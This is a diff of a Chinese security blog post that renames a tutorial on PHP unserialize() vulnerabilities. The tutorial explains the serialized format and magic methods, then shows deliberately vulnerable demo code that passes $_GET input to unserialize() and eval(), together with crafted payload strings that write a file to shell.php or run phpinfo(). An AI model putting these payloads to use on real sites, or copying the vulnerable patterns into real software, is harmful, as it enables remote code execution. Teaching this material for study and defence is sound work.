@@ -4,7 +4,7 @@
     <meta charset="utf-8">
     
     
-    <title>php反序列化漏洞 | DD&#39;s Blog</title>
+    <title>php反序列化漏洞——unserialize | DD&#39;s Blog</title>
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
     
     <meta name="keywords" content>
@@ -146,7 +146,7 @@
           <i class="icon icon-lg icon-navicon"></i>
         </a>
         <div class="flex-col header-title ellipsis">
-            <span>php反序列化漏洞</span>
+            <span>php反序列化漏洞——unserialize</span>
             
         </div>
         
@@ -159,7 +159,7 @@
 <header class="content-header post-header">
     <img src="/img/banner.jpg" class="header-bg">
     <div class="container fade-scale">
-        <h1 class="title">php反序列化漏洞</h1>
+        <h1 class="title">php反序列化漏洞——unserialize</h1>
         <h5 class="subtitle">
             
                 <time datetime="2020-01-21T08:41:09.000Z" itemprop="datePublished" class="page-time">
@@ -190,10 +190,10 @@
 
 
 <div class="container body-wrap">
-    <article id="post-php反序列化漏洞"
+    <article id="post-php反序列化漏洞——unserialize"
   class="post-article article-type-post" itemprop="blogPost">
     <div class="post-card">
-        <h1 class="post-card-title">php反序列化漏洞</h1>
+        <h1 class="post-card-title">php反序列化漏洞——unserialize</h1>
         <div class="post-meta">
             <time class="post-time" title="2020-01-21 16:41:09" datetime="2020-01-21T08:41:09.000Z"  itemprop="datePublished">2020-01-21</time>
 
@@ -210,12 +210,12 @@
         <div class="post-content" id="post-content" itemprop="postContent">
             
             <h2 id="serialize"><a href="#serialize" class="headerlink" title="serialize()"></a>serialize()</h2><p>当在php中创建了一个对象后，可以通过serialize()把这个对象转变成一个字符串，保存对象的值方便之后的传递与使用。测试代码如下：</p>
-<a rel=php反序列化漏洞 href="/2020/01/21/php反序列化漏洞/1.png" title="" data-fancybox="images"><img src="/2020/01/21/php反序列化漏洞/1.png"></a>
+<a rel=php反序列化漏洞——unserialize href="/2020/01/21/php反序列化漏洞——unserialize/1.png" title="" data-fancybox="images"><img src="/2020/01/21/php反序列化漏洞——unserialize/1.png"></a>
 
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">O为存储对象，如果给serialize()传入的是一个数组，那就是A</span><br><span class="line">1为对象名称有1个字符</span><br><span class="line">a为对象名称</span><br><span class="line">1表示有一个值</span><br><span class="line">s表示字符串，i则表示数字</span><br><span class="line">4表示字符串的长度</span><br><span class="line"><span class="built_in">test</span>为字符串的名称</span><br></pre></td></tr></table></figure>
 
 <h2 id="unserialize"><a href="#unserialize" class="headerlink" title="unserialize()"></a>unserialize()</h2><p>与serizalize()对应的，unserialize()可以从已存储的表示中创建PHP的值，可以从序列化后的结果中恢复对象（object）。</p>
-<a rel=php反序列化漏洞 href="/2020/01/21/php反序列化漏洞/2.png" title="" data-fancybox="images"><img src="/2020/01/21/php反序列化漏洞/2.png"></a>
+<a rel=php反序列化漏洞——unserialize href="/2020/01/21/php反序列化漏洞——unserialize/2.png" title="" data-fancybox="images"><img src="/2020/01/21/php反序列化漏洞——unserialize/2.png"></a>
 
 <h2 id="反序列化漏洞"><a href="#反序列化漏洞" class="headerlink" title="反序列化漏洞"></a>反序列化漏洞</h2><h3 id="利用构造函数等"><a href="#利用构造函数等" class="headerlink" title="利用构造函数等"></a>利用构造函数等</h3><h4 id="Magic-function"><a href="#Magic-function" class="headerlink" title="Magic function"></a>Magic function</h4><p>php中有一类特殊的方法叫“<a href="https://www.php.net/manual/zh/language.oop5.magic.php" target="_blank" rel="noopener">Magic function</a>”：</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">构造函数__constru(): 当对象创建（new）时会自动调用，但在unserialize()时是不会调用的。</span><br><span class="line">析构函数__destruct(): 当对象被销毁时会自动调用</span><br><span class="line">__wakeup(): unserialize()时会自动调用</span><br></pre></td></tr></table></figure>
@@ -224,7 +224,7 @@
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">a</span></span>&#123;</span><br><span class="line">	<span class="keyword">var</span> $test = <span class="string">"aaa"</span>;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">"__wakeup()函数已被调用"</span>;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">"&lt;/br&gt;"</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">"__construct()函数已被调用"</span>;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">"&lt;/br&gt;"</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">"__destruct()函数已被调用"</span>;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">"&lt;/br&gt;"</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">$class1 = <span class="string">'O:1:"a":1:&#123;s:4:"test";s:3:"aaa";&#125;'</span>;</span><br><span class="line">print_r($class1);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;/br&gt;"</span>;</span><br><span class="line">$class1_unser = unserialize($class1);</span><br><span class="line">print_r($class1_unser);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;/br&gt;"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 
 <p>运行结果如下：</p>
-<a rel=php反序列化漏洞 href="/2020/01/21/php反序列化漏洞/3.png" title="" data-fancybox="images"><img src="/2020/01/21/php反序列化漏洞/3.png"></a>
+<a rel=php反序列化漏洞——unserialize href="/2020/01/21/php反序列化漏洞——unserialize/3.png" title="" data-fancybox="images"><img src="/2020/01/21/php反序列化漏洞——unserialize/3.png"></a>
 
 <p>因为没有创建对象，所以构造函数<strong>construct()不会被调用，但是</strong>wakeup()跟__destruct()函数</p>
 <h4 id="wakeup-或destruct-的利用"><a href="#wakeup-或destruct-的利用" class="headerlink" title="wakeup()或destruct()的利用"></a><strong><strong>wakeup()或</strong>destruct()的利用</strong></h4><p>因为unserialize()后<strong>wakeup()或</strong>destruct()会直接调用，中间无需其他的过程。因此最好的情况就是一些漏洞/危害代码在<strong>wakeup()或</strong>destruct()中，从而当我们控制序列化字符串时可以直接取触发它们。如：</p>
@@ -232,10 +232,10 @@
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">a</span></span>&#123;</span><br><span class="line">	<span class="keyword">var</span> $test = <span class="string">'aaa'</span>;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123;</span><br><span class="line">		$fp = fopen(<span class="string">"shell.php"</span>,<span class="string">"w"</span>);</span><br><span class="line">		fwrite($fp, <span class="keyword">$this</span> -&gt; test);</span><br><span class="line">		fclose($fp);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">$class1 = <span class="keyword">new</span> a();</span><br><span class="line">$class1 -&gt; test = <span class="string">"&lt;?php phpinfo(); ?&gt;"</span>;</span><br><span class="line">$class1_ser = serialize($class1);</span><br><span class="line">print_r($class1_ser);</span><br><span class="line"><span class="keyword">print</span>(<span class="string">"&lt;/br&gt;"</span>);</span><br><span class="line">$class1_unser = unserialize($class1_ser);</span><br><span class="line">print_r($class1_unser);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 
 <p>运行结果：</p>
-<a rel=php反序列化漏洞 href="/2020/01/21/php反序列化漏洞/4.png" title="" data-fancybox="images"><img src="/2020/01/21/php反序列化漏洞/4.png"></a>
+<a rel=php反序列化漏洞——unserialize href="/2020/01/21/php反序列化漏洞——unserialize/4.png" title="" data-fancybox="images"><img src="/2020/01/21/php反序列化漏洞——unserialize/4.png"></a>
 
 <p>shell.php文件</p>
-<a rel=php反序列化漏洞 href="/2020/01/21/php反序列化漏洞/5.png" title="" data-fancybox="images"><img src="/2020/01/21/php反序列化漏洞/5.png"></a>
+<a rel=php反序列化漏洞——unserialize href="/2020/01/21/php反序列化漏洞——unserialize/5.png" title="" data-fancybox="images"><img src="/2020/01/21/php反序列化漏洞——unserialize/5.png"></a>
 
 <p>成功写入shell.php文件</p>
 <p>但具体的环境多是下面代码这样，我们的test是我们可控的参数</p>
@@ -243,19 +243,19 @@
 
 <p>利用上述代码生成参数O:1:”a”:1:{s:4:”test”;s:18:”<?php phpinfo();?>“;}</p>
 <p>传如参数得：</p>
-<a rel=php反序列化漏洞 href="/2020/01/21/php反序列化漏洞/6.png" title="" data-fancybox="images"><img src="/2020/01/21/php反序列化漏洞/6.png"></a>
+<a rel=php反序列化漏洞——unserialize href="/2020/01/21/php反序列化漏洞——unserialize/6.png" title="" data-fancybox="images"><img src="/2020/01/21/php反序列化漏洞——unserialize/6.png"></a>
 
 <h4 id="其他Magic-function的利用"><a href="#其他Magic-function的利用" class="headerlink" title="其他Magic function的利用"></a>其他Magic function的利用</h4><p>有时候反序列化一个对象时，由它调用的__wakeup()中又去调用了其他的对象，由此可以溯源而上，最后找到漏洞点。</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">b</span></span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($test)</span></span>&#123;</span><br><span class="line">		$fp = fopen(<span class="string">"shell.php"</span>,<span class="string">"w"</span>);</span><br><span class="line">		fwrite($fp, $test);</span><br><span class="line">		fclose($fp);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">a</span></span>&#123;</span><br><span class="line">	<span class="keyword">var</span> $test = <span class="string">'aaa'</span>;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123;</span><br><span class="line">		$obj = <span class="keyword">new</span> a(<span class="keyword">$this</span> -&gt; test);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$class1 = $_GET[<span class="string">'test'</span>];</span><br><span class="line">print_r($class1);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;/br&gt;"</span>;</span><br><span class="line">$class1_unser = unserialize($class1);</span><br><span class="line"><span class="keyword">require</span> <span class="string">"shell.php"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 
 <p>这里我们给test传入构造好的序列化字符串后，进行反序列化时自动调用 <em>\</em>wakeup()函数，从而在new joker()会自动调用对象joker中的<em>\</em>construct()方法，从而把<?php phpinfo();?>写入到shell.php中：</p>
-<a rel=php反序列化漏洞 href="/2020/01/21/php反序列化漏洞/7.png" title="" data-fancybox="images"><img src="/2020/01/21/php反序列化漏洞/7.png"></a>
+<a rel=php反序列化漏洞——unserialize href="/2020/01/21/php反序列化漏洞——unserialize/7.png" title="" data-fancybox="images"><img src="/2020/01/21/php反序列化漏洞——unserialize/7.png"></a>
 
 <h3 id="利用普通成员方法"><a href="#利用普通成员方法" class="headerlink" title="利用普通成员方法"></a>利用普通成员方法</h3><p>前面谈到的利用都是基于“自动调用”的magic function。但当漏洞/危险代码存在类的普通方法中，就不能指望通过“自动调用”来达到目的了。这时的利用方法如下，寻找相同的函数名，把敏感函数和类联系在一起</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">a</span></span>&#123;</span><br><span class="line">	<span class="keyword">var</span> $test;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">		<span class="keyword">$this</span> -&gt; test = <span class="keyword">new</span> b();</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">		<span class="keyword">$this</span> -&gt; test -&gt; action();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">b</span></span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">action</span><span class="params">()</span></span>&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">"b"</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">c</span></span>&#123;</span><br><span class="line">	<span class="keyword">var</span> $test2;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">action</span><span class="params">()</span></span>&#123;</span><br><span class="line">		<span class="keyword">eval</span>(<span class="keyword">$this</span> -&gt; test2);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">$class1 = <span class="keyword">new</span> a();</span><br><span class="line">unserialize($_GET[<span class="string">'test'</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 
 <p>本意上，new一个新的a对象后，调用<strong>construct()，其中有new了一个b对象。结束后会调用</strong>destruct()，其中会调用action()，从而输出 b。</p>
-<a rel=php反序列化漏洞 href="/2020/01/21/php反序列化漏洞/8.png" title="" data-fancybox="images"><img src="/2020/01/21/php反序列化漏洞/8.png"></a>
+<a rel=php反序列化漏洞——unserialize href="/2020/01/21/php反序列化漏洞——unserialize/8.png" title="" data-fancybox="images"><img src="/2020/01/21/php反序列化漏洞——unserialize/8.png"></a>
 
 <p>利用过程，构造序列化：</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">a</span></span>&#123;</span><br><span class="line">	<span class="keyword">var</span> $test;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">		<span class="keyword">$this</span> -&gt; test = <span class="keyword">new</span> c();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">c</span></span>&#123;</span><br><span class="line">	<span class="keyword">var</span> $test2 = <span class="string">"phpinfo();"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="keyword">new</span> a());</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
@@ -264,7 +264,7 @@
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:1:<span class="string">"a"</span>:1:&#123;s:4:<span class="string">"test"</span>;O:1:<span class="string">"c"</span>:1:&#123;s:5:<span class="string">"test2"</span>;s:10:<span class="string">"phpinfo();"</span>;&#125;&#125;</span><br></pre></td></tr></table></figure>
 
 <p>传给test.php，成功利用：</p>
-<a rel=php反序列化漏洞 href="/2020/01/21/php反序列化漏洞/9.png" title="" data-fancybox="images"><img src="/2020/01/21/php反序列化漏洞/9.png"></a>
+<a rel=php反序列化漏洞——unserialize href="/2020/01/21/php反序列化漏洞——unserialize/9.png" title="" data-fancybox="images"><img src="/2020/01/21/php反序列化漏洞——unserialize/9.png"></a>
 
         </div>
         
@@ -272,12 +272,12 @@
     <div class="content">
         
 <span class="post-time">
-    Last updated: <time datetime="2020-01-28T05:48:04.523Z" itemprop="dateUpdated">2020-01-28 13:48:04</time>
+    Last updated: <time datetime="2020-01-29T04:40:03.656Z" itemprop="dateUpdated">2020-01-29 12:40:03</time>
 </span><br>
 
 
         
-        转载注明出处，原文地址：<a href="/2020/01/21/php反序列化漏洞/" target="_blank" rel="external">https://ddstick.github.io/2020/01/21/php反序列化漏洞/</a>
+        转载注明出处，原文地址：<a href="/2020/01/21/php反序列化漏洞——unserialize/" target="_blank" rel="external">https://ddstick.github.io/2020/01/21/php反序列化漏洞——unserialize/</a>
         
     </div>
     <footer>
@@ -304,7 +304,7 @@
     <ul class="reset share-icons">
       
       <li>
-        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=https://ddstick.github.io/2020/01/21/php反序列化漏洞/&title=《php反序列化漏洞》 — DD's Blog&pic=https://ddstick.github.io/img/dd.jpg" data-title="微博">
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=https://ddstick.github.io/2020/01/21/php反序列化漏洞——unserialize/&title=《php反序列化漏洞——unserialize》 — DD's Blog&pic=https://ddstick.github.io/img/dd.jpg" data-title="微博">
           <i class="icon icon-weibo"></i>
         </a>
       </li>
@@ -316,7 +316,7 @@
       </li>
       
       <li>
-        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://ddstick.github.io/2020/01/21/php反序列化漏洞/&title=《php反序列化漏洞》 — DD's Blog&source=" data-title=" QQ">
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://ddstick.github.io/2020/01/21/php反序列化漏洞——unserialize/&title=《php反序列化漏洞——unserialize》 — DD's Blog&source=" data-title=" QQ">
           <i class="icon icon-qq"></i>
         </a>
       </li>
@@ -339,7 +339,14 @@
         
     </div>
     
-<nav class="post-nav flex-row flex-justify-between flex-row-reverse">
+<nav class="post-nav flex-row flex-justify-between">
+  
+    <div class="prev">
+      <a href="/2020/01/29/php反序列化漏洞——Session/" id="post-prev" class="post-nav-link">
+        <div class="tips"><i class="icon icon-angle-left icon-lg icon-pr"></i> Prev</div>
+        <h4 class="title">php反序列化漏洞——Session</h4>
+      </a>
+    </div>
   
 
   
@@ -455,7 +462,7 @@
     <ul class="reset share-icons">
       
       <li>
-        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=https://ddstick.github.io/2020/01/21/php反序列化漏洞/&title=《php反序列化漏洞》 — DD's Blog&pic=https://ddstick.github.io/img/dd.jpg" data-title="微博">
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=https://ddstick.github.io/2020/01/21/php反序列化漏洞——unserialize/&title=《php反序列化漏洞——unserialize》 — DD's Blog&pic=https://ddstick.github.io/img/dd.jpg" data-title="微博">
           <i class="icon icon-weibo"></i>
         </a>
       </li>
@@ -467,7 +474,7 @@
       </li>
       
       <li>
-        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://ddstick.github.io/2020/01/21/php反序列化漏洞/&title=《php反序列化漏洞》 — DD's Blog&source=" data-title=" QQ">
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://ddstick.github.io/2020/01/21/php反序列化漏洞——unserialize/&title=《php反序列化漏洞——unserialize》 — DD's Blog&source=" data-title=" QQ">
           <i class="icon icon-qq"></i>
         </a>
       </li>
@@ -479,7 +486,7 @@
 <div class="page-modal wx-share" id="wxShare">
     <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
     <p>扫一扫，分享到微信</p>
-    <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAMYAAADGCAAAAACs8KCBAAACJElEQVR42u3a0WqEQAwF0P3/n7avhWX1JrGFjccnodbJcSFMMnm94uv4dZ0/8/78p/96/2uyyujCwMD4WsZxevWeOYfduy4GBsZzGEkCrd6/vzlJyp/uL2LGwMDACLZ35wFNkjIGBgZGjxFt14LSNEnKGBgYGHkx2et3JU9OCl0MDIwnMPKu+//f/8n5BgYGxlcxjuKVt9juStZRVBgYGKsZk2XyhtokcReGPzAwMFYzJi9N2nB5KMnB50VUGBgY6xh526vauM83fDcMc2BgYKxm9BptvYDy3FhN2RgYGLsZ1cTaG5uYDHNE5TQGBsZqRq8GzHN5dZgs+RAXVTgGBsYDGNVEWW3l9w47o60nBgbGakZ1mV67P9/wjXIpBgbGUkZefN5VlPZadYXfAQMDYxEjSWTJYlVwwitsPTEwMFYzelu0e5Ns0oYrD1tgYGCsY1QXmLTS5gUtBgbG0xi9w8gjuO5q4UWfFQMDYzUjDysvL3tbwB7+lb8aAwNjHSMffZgfTOZl6kWEGBgYj2RUi9hq0sw3neVTDgwMjKWMXtD5qEQ5rOrpJAYGxlJGr3zNW/bVNN3bqmJgYOxm9NJcsnw16PxAojp2hoGBsYPRa9bnR56Tz1H43hgYGA9gVMMqtOzjztgkWgwMDIxq4dp7w6g9h4GBgREPWORBTIY5PhaxGBgYqxlJEXvX4eU84WJgYDyN0Ssd8zGvfBNZHSzDwMB4AOMHHHhqmOLa93wAAAAASUVORK5CYII=" alt="微信分享二维码">
+    <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAN4AAADeCAAAAAB3DOFrAAACvUlEQVR42u3awW7rMAwEwPz/T6fXB7zaWZJi6sP4FCSupVEBSV7x9Yqv9z/X/9/cX1fPuXrmfYuvjQsPDw9v0PX7hq86ff+0pLv5cOR9xsPDw9vmXXU0vydZQnoz+aQ/eHh4eE/g5fff35ksNgkVDw8P7/m8+2XgfrpPPudbfDw8PLy/5VUflwQNvaWi2uKxrAUPDw8v5uUBwXM+r5zv4eHh4Y1P1Q8cPsVb8LzIoNBbPDw8vAVePuHOi6XOlmQVhg8PDw9vmVcNJqohxaTEKomef/kVDw8Pb4HX61be6Xk5Qq8tPDw8vA1edSvcixjybXFySJb/k/Dw8PA2eNVJf/5XeTFB/pwIj4eHh3eIl7/295aNaiCbH7xFz8fDw8Nb403e5XuFWVVGr8IKDw8Pb4OXH2hN9uy947RewUEhOcbDw8Nr8fLJN4lW8xg334hXBwsPDw/vb3l5AcGpY628rWhzj4eHh7fGm5RbVfHvwVUdODw8PLzv8ObxQTUC7rUVhct4eHh4C7yNECE/xKpuyquRMR4eHt4Gr1cQkG/BvxNPfKiMwMPDwzvKq4az1YCgGnNUj+XyQcHDw8M7y+tN08mk3Oto/vxRmIuHh4fX4uWTeNLRavO9g7dm6QAeHh7eIV4+QfeKq/JBqW7rJ0VgeHh4eHNe1V0tjZqEEclgFd4Y8PDw8NZ41aKB6pSdLAb5RvzDZhoPDw/vK7zqsf08lk1C5AMHYHh4eHhj3rt45Q33QuFJ4UIUQ+Dh4eGNedVpfRJbJN/kg5IUMeDh4eHt8SbH83lBQHVar8YihTcGPDw8vEO8PL3I7+8tA9W168N2Hw8PD+8xvMnGurfAJFHI5QEYHh4e3iN5pxaAXinDh6IrPDw8vAXepDQqiRXyUCMfuMLCgIeHh3eUN3nhzwsOqgtAb6F69S48PDy8lPcDyO9pzg8wtNEAAAAASUVORK5CYII=" alt="微信分享二维码">
 </div>
 
 
